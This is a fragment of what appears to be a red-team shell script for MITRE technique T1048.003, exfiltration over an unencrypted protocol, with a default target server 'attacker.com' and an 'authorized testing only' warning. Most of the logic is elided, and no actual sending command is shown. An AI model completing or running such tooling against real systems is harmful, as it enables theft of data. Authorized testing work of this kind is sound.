...
# Technique: T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003)
# WARNING: Authorized testing only.

DATA="${1:-/tmp/collected}"
SERVER="${2:-attacker.com}"

echo "[*] Black Aegis - T1048.003 Exfiltration"
echo "[*] Data: $DATA"
echo "[*] Server: $SERVER"
...
case "T1048.003" in
    ...
    T1567.001)
        ...
        ;;
    *)
        echo "[+] Exfiltration via Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003)"
